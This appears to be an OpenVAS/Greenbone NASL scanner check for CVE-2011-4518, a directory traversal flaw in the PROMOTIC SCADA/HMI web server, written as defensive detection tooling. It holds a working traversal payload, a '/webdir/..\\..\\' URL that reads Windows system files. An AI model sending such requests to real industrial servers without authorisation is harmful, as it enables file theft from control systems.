if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802041" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-10-20 08:43:23 +0200 (Thu, 20 Oct 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2011-4518" );
	script_name( "PROMOTIC SCADA/HMI Webserver Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web Servers" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Promotic/banner" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/46430" );
	script_xref( name: "URL", value: "http://aluigi.altervista.org/adv/promotic_1-adv.txt" );
	script_xref( name: "URL", value: "http://www.promotic.eu/en/promotic/scada-pm.htm" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks." );
	script_tag( name: "affected", value: "PROMOTIC SCADA/HMI Server Version 8.1.3. Other versions may
  also be affected." );
	script_tag( name: "insight", value: "The flaw is due to improper validation of URI containing
  '..\\..\\' sequences, which allows attackers to read arbitrary files via directory traversal attacks." );
	script_tag( name: "solution", value: "Update to version 8.1.5 or later." );
	script_tag( name: "summary", value: "The host is running PROMOTIC SCADA/HMI Webserver and is prone to
  directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
res = http_get_cache( item: "/webdir/default.htm", port: port );
if(!ContainsString( res, ">PROMOTIC WEB Server<" ) || !ContainsString( res, "Server: Pm" )){
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	file = files[pattern];
	file = str_replace( find: "/", string: file, replace: "\\" );
	url = "/webdir/..\\..\\..\\..\\..\\..\\..\\..\\..\\" + file;
	if(http_vuln_check( port: port, url: url, pattern: pattern )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

